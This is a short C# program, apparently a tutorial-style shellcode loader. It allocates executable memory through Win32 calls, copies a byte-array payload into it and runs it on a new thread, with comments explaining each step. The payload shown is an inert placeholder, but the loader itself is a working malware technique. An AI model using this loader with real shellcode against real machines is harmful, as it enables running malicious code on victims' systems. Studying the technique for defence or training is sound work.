using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Basic_Loader
{
    internal class Program
    {

        // importing DLL and Win32API

        [DllImport("kernel32", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationtype, uint flProtect);

        [DllImport("kernel32")]
        static extern IntPtr CreateThread(IntPtr lpthreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreaId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // main function
        static void Main(string[] args)
        {

            // payload
            byte[] buf = new byte[4]
            {
               0x90,
               0x90,
               0xcc,
               0xc3
            };

            // defining a size variable for the payload to use later
            int payloadSize = buf.Length;

            // allocating our memory based off of the location we want (anywhere), how much memory, and then the permissions.
            IntPtr memoryAddress = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // copy our payload into the memory address
            Marshal.Copy(buf, 0, memoryAddress, payloadSize);

            // setting up a thread to our memory address so that it can be executed
            IntPtr ourThread = CreateThread(IntPtr.Zero, 0, memoryAddress, IntPtr.Zero, 0, IntPtr.Zero);

            // telling the thread to launch/execute
            WaitForSingleObject(ourThread, 0xFFFFFFFF);

        }
    }
}
